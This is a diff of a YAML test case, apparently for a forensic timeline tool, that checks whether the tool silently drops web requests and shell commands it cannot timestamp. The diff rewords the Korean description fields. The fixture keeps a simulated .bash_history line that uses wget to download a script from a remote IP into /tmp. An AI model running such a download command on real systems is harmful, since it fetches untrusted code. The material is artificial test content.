@@ -13,8 +13,8 @@ realism: common
 realism_ko: "타임스탬프 없는 `.bash_history`는 기본 설정이라 매우 흔하고, ISO 시각 access log도 쓰인다."
 coverage: full
 summary: With an access.log written in ISO 8601 time ($time_iso8601) and a .bash_history without timestamps, build_timeline lists only the single auth.log event, under "Events 1", and gives no count or note for the web request and shell command it dropped.
-summary_ko: "ISO 8601 시각($time_iso8601)으로 쓴 access.log와 타임스탬프 없는 .bash_history가 있을 때, build_timeline은 auth.log 이벤트 하나만 \"Events 1\"로 나열하고 빠뜨린 웹 요청과 셸 명령에 대한 수나 알림은 주지 않는다."
-defect_ko: "정상이라면 시각을 읽지 못한 사건을 버렸으면 그 수를 알려야 하는데, 이 서버는 웹 요청과 셸 명령을 말없이 빼고 남은 사건 수만 보인다. 그래서 모델은 타임라인이 증거 전체를 담았다고 잘못 안다."
+summary_ko: "access.log는 ISO 8601 시각($time_iso8601)으로, `.bash_history`는 타임스탬프 없이 적혀 있다. `build_timeline`은 `auth.log` 이벤트 하나만 \"Events 1\"로 나열하고, 빠진 웹 요청과 셸 명령의 수나 알림은 주지 않는다."
+defect_ko: "시각을 읽지 못한 사건을 이 서버는 말없이 빼고 남은 사건 수만 보인다. 버린 사건이 있으면 그 수를 알려야 한다. 모델은 타임라인이 증거 전체를 담았다고 잘못 안다."
 setup_ko: "auth.log 한 줄, ISO 8601 시각의 access.log 한 줄, 타임스탬프 없는 `.bash_history` 한 줄을 넣었다."
 fixture:
   - path: case/auth.log
@@ -25,7 +25,7 @@ fixture:
     text: "wget http://203.0.113.7/x.sh -O /tmp/x.sh\n"
 steps:
   - tool: build_timeline
-    note_ko: "결함이 있는 호출: 세 가지 로그로 타임라인을 만듦"
+    note_ko: "결함 호출: 세 가지 로그로 타임라인을 만듦"
     args:
       evidence_root: ${EVIDENCE}/case
 expect:
